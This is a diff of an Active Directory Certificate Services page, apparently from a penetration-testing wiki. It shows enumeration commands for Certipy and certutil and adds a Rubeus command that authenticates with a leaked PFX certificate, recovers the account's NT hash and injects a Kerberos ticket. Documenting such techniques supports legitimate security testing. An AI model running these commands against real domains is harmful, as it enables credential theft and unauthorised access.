@@ -103,7 +103,7 @@ Schannel facilitates secure TLS/SSL connections, where during a handshake, the c
 
 ### AD Certificate Services Enumeration
 
-AD's certificate services can be enumerated through LDAP queries, revealing information about **Enterprise Certificate Authorities (CAs)** and their configurations. This is accessible by any domain-authenticated user without special privileges.<sup>[[1]](#references)</sup> Tools like **[Certify](https://github.com/GhostPack/Certify)** and **[Certipy](https://github.com/ly4k/Certipy)** are used for enumeration and vulnerability assessment in AD CS environments.
+AD's certificate services can be enumerated through LDAP queries, revealing information about **Enterprise Certificate Authorities (CAs)** and their configurations. This is accessible by any domain-authenticated user without special privileges.<sup>[[1]](#references)</sup> Tools like **[Certify](https://github.com/GhostPack/Certify)** and **[Certipy](https://github.com/ly4k/Certipy)** are used for enumeration and vulnerability assessment in AD CS environments.<sup>[[3]](#references)</sup>
 
 Commands for using these tools include:
 
@@ -129,6 +129,12 @@ certipy find -vulnerable -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128
 # Enumerate Enterprise CAs and certificate templates with certutil
 certutil.exe -TCAInfo
 certutil -v -dstemplate
+```
+
+Rubeus can also use a password-protected PFX certificate for PKINIT authentication and request a TGT. The optional `/getcredentials` switch requests a U2U service ticket and attempts to recover the account NT hash:<sup>[[4]](#references)</sup>
+
+```powershell
+Rubeus.exe asktgt /user:<USER> /certificate:C:\temp\leaked.pfx /password:<PFX_PASSWORD> /getcredentials /ptt
 ```
 
 ## References
